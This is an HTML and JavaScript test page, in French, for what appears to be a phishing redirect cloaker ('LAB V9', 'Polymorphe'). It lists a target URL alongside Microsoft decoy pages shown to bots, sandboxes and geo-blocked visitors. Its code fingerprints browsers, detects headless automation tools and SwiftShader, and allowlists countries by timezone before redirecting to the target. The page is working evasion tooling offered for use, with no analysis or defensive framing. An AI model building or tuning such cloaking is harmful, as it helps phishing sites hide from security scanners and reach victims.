<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Test Redirection LAB</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 10px;
            backdrop-filter: blur(10px);
        }
        h1 {
            text-align: center;
            margin-bottom: 30px;
        }
        .test-section {
            margin: 20px 0;
            padding: 20px;
            background: rgba(0,0,0,0.2);
            border-radius: 5px;
        }
        .url-display {
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 3px;
            font-family: monospace;
            word-break: break-all;
            margin: 10px 0;
        }
        button {
            background: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 5px;
        }
        button:hover {
            background: #45a049;
        }
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 5px;
            display: none;
        }
        .status.success {
            background: rgba(76, 175, 80, 0.3);
            display: block;
        }
        .status.error {
            background: rgba(244, 67, 54, 0.3);
            display: block;
        }
        .info {
            background: rgba(33, 150, 243, 0.3);
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
        }
        pre {
            background: rgba(0,0,0,0.4);
            padding: 10px;
            border-radius: 3px;
            overflow-x: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üî¨ Test de Redirection - LAB V9</h1>

        <div class="info">
            <h3>üìä Configuration actuelle:</h3>
            <div class="url-display">
                <strong>URL Cible:</strong> https://remsi.sbs/brcde
            </div>
            <div class="url-display">
                <strong>URL Bot/Sandbox:</strong> https://account.microsoft.com/security
            </div>
            <div class="url-display">
                <strong>URL G√©o-bloqu√©e:</strong> https://www.microsoft.com/404
            </div>
        </div>

        <div class="test-section">
            <h3>üß™ Tests de d√©tection:</h3>

            <button onclick="testFingerprint()">Test Fingerprinting</button>
            <button onclick="testUserAgent()">Test User-Agent</button>
            <button onclick="testWebGL()">Test WebGL</button>
            <button onclick="testCanvas()">Test Canvas</button>
            <button onclick="testTimezone()">Test Timezone</button>

            <div id="testResults" class="status"></div>
        </div>

        <div class="test-section">
            <h3>üöÄ Lancer la redirection:</h3>

            <button onclick="launchRedirect('v9')">Lancer V9 (Polymorphe)</button>
            <button onclick="launchRedirect('v1')">Lancer V1 (Original)</button>
            <button onclick="testDirectLink()">Test Direct (remsi.sbs)</button>

            <div id="redirectStatus" class="status"></div>
        </div>

        <div class="test-section">
            <h3>üìà M√©triques en temps r√©el:</h3>
            <pre id="metrics">En attente...</pre>
        </div>
    </div>

    <script>
        // Fonction de test fingerprinting
        function testFingerprint() {
            const results = document.getElementById('testResults');
            let output = '<h4>R√©sultats Fingerprinting:</h4>';

            // Test plugins
            output += `<p>Plugins: ${navigator.plugins.length}</p>`;

            // Test languages
            output += `<p>Languages: ${navigator.languages.join(', ')}</p>`;

            // Test screen
            output += `<p>Screen: ${screen.width}x${screen.height} (${screen.colorDepth}bit)</p>`;

            // Test timezone
            output += `<p>Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}</p>`;

            // Test WebDriver
            output += `<p>WebDriver: ${navigator.webdriver === true ? 'DETECTED' : 'Clean'}</p>`;

            // Test hardware
            output += `<p>CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'}</p>`;
            output += `<p>Memory: ${navigator.deviceMemory || 'Unknown'}GB</p>`;

            results.innerHTML = output;
            results.className = 'status success';

            updateMetrics();
        }

        // Test User-Agent
        function testUserAgent() {
            const results = document.getElementById('testResults');
            const ua = navigator.userAgent;

            const botPatterns = [
                /bot/i, /crawler/i, /spider/i, /headless/i,
                /phantom/i, /selenium/i, /puppeteer/i, /playwright/i
            ];

            let isBot = false;
            for(let pattern of botPatterns) {
                if(pattern.test(ua)) {
                    isBot = true;
                    break;
                }
            }

            results.innerHTML = `
                <h4>User-Agent Analysis:</h4>
                <p style="word-break: break-all;">${ua}</p>
                <p>D√©tect√© comme: <strong>${isBot ? 'BOT ‚ö†Ô∏è' : 'HUMAIN ‚úÖ'}</strong></p>
            `;
            results.className = isBot ? 'status error' : 'status success';

            updateMetrics();
        }

        // Test WebGL
        function testWebGL() {
            const results = document.getElementById('testResults');
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if(gl) {
                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                if(debugInfo) {
                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);

                    results.innerHTML = `
                        <h4>WebGL Info:</h4>
                        <p>Vendor: ${vendor}</p>
                        <p>Renderer: ${renderer}</p>
                        <p>SwiftShader: ${renderer.includes('SwiftShader') ? 'OUI ‚ö†Ô∏è' : 'NON ‚úÖ'}</p>
                    `;
                } else {
                    results.innerHTML = '<p>WebGL Debug info non disponible</p>';
                }
            } else {
                results.innerHTML = '<p>WebGL non support√© ‚ö†Ô∏è</p>';
            }

            results.className = 'status success';
            updateMetrics();
        }

        // Test Canvas
        function testCanvas() {
            const results = document.getElementById('testResults');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);

            const dataURL = canvas.toDataURL();
            const hash = dataURL.split(',')[1].substring(0, 20);

            results.innerHTML = `
                <h4>Canvas Fingerprint:</h4>
                <p>Hash: ${hash}...</p>
                <p>Longueur: ${dataURL.length}</p>
                <p>Status: ${dataURL === 'data:,' ? 'BLOQU√â ‚ö†Ô∏è' : 'OK ‚úÖ'}</p>
            `;

            results.className = 'status success';
            updateMetrics();
        }

        // Test Timezone
        function testTimezone() {
            const results = document.getElementById('testResults');
            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const offset = new Date().getTimezoneOffset();

            const allowedCountries = ['US', 'CA', 'GB', 'FR', 'DE', 'AU', 'NL', 'BE', 'CH', 'IT', 'ES', 'SE', 'NO', 'DK', 'FI'];

            const tzMap = {
                'America/New_York': 'US',
                'America/Chicago': 'US',
                'America/Los_Angeles': 'US',
                'Europe/Paris': 'FR',
                'Europe/London': 'GB',
                'Europe/Berlin': 'DE',
                'Europe/Amsterdam': 'NL'
            };

            const country = tzMap[tz] || 'Unknown';
            const allowed = allowedCountries.includes(country);

            results.innerHTML = `
                <h4>G√©olocalisation:</h4>
                <p>Timezone: ${tz}</p>
                <p>Offset: ${offset}</p>
                <p>Pays d√©tect√©: ${country}</p>
                <p>Acc√®s: ${allowed ? 'AUTORIS√â ‚úÖ' : 'BLOQU√â ‚ö†Ô∏è'}</p>
            `;

            results.className = allowed ? 'status success' : 'status error';
            updateMetrics();
        }

        // Lancer redirection
        function launchRedirect(version) {
            const status = document.getElementById('redirectStatus');

            if(version === 'v9') {
                status.innerHTML = `
                    <h4>Lancement V9...</h4>
                    <p>Ouverture de index_v9.html dans 3 secondes...</p>
                    <p>URL cible: https://remsi.sbs/brcde</p>
                `;
                setTimeout(() => {
                    window.open('index_v9.html', '_blank');
                }, 3000);
            } else {
                status.innerHTML = `
                    <h4>Lancement V1...</h4>
                    <p>Ouverture de OLD/index.html dans 3 secondes...</p>
                `;
                setTimeout(() => {
                    window.open('OLD/index.html', '_blank');
                }, 3000);
            }

            status.className = 'status success';
        }

        // Test lien direct
        function testDirectLink() {
            const status = document.getElementById('redirectStatus');
            status.innerHTML = `
                <h4>Test direct...</h4>
                <p>Ouverture de https://remsi.sbs/brcde dans 3 secondes...</p>
                <p>‚ö†Ô∏è V√©rifiez si l'URL est accessible</p>
            `;
            status.className = 'status success';

            setTimeout(() => {
                window.open('https://remsi.sbs/brcde', '_blank');
            }, 3000);
        }

        // Update metrics
        function updateMetrics() {
            const metrics = document.getElementById('metrics');
            const now = new Date();

            metrics.innerHTML = `
Timestamp: ${now.toISOString()}
User-Agent: ${navigator.userAgent.substring(0, 50)}...
Platform: ${navigator.platform}
Online: ${navigator.onLine}
Cookies: ${navigator.cookieEnabled}
DNT: ${navigator.doNotTrack}
Language: ${navigator.language}
Screen: ${screen.width}x${screen.height}
Window: ${window.innerWidth}x${window.innerHeight}
DeviceMemory: ${navigator.deviceMemory || 'N/A'}
CPU: ${navigator.hardwareConcurrency || 'N/A'}
Connection: ${navigator.connection ? navigator.connection.effectiveType : 'N/A'}
            `;
        }

        // Initial metrics
        updateMetrics();
        setInterval(updateMetrics, 5000);
    </script>
</body>
</html>